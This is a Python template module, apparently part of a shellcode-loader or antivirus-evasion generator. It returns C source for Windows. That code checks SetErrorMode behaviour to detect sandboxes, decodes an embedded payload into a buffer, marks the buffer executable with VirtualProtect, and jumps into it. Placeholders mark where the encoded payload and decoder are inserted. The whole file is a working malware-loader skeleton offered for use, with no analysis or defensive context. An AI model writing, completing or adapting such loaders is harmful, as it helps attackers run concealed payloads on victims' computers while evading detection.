###"Technical principle: "
from templates.template import *
class template(ITemplate):
    @staticmethod
    def get():
        c_code = '''
#include<windows.h>
#include<stdio.h>

<TABLES>
int main(){

  SetErrorMode(SEM_FAILCRITICALERRORS | SEM_NOALIGNMENTFAULTEXCEPT | SEM_NOGPFAULTERRORBOX | SEM_NOOPENFILEERRORBOX);

  DWORD dwCode ;
  dwCode = SetErrorMode(0x400);
  dwCode = SetErrorMode(0x0);
  if (dwCode != 0x400)
  {
    return 0;
  }
  
	PCHAR lpBuffer = <ALLOC>
    <DECODE>
	
    VirtualProtect(lpBuffer, sizeof(offset_table), PAGE_EXECUTE_READ, NULL);
    ((void(*)(void))lpBuffer)();
}    
    
'''
        return c_code

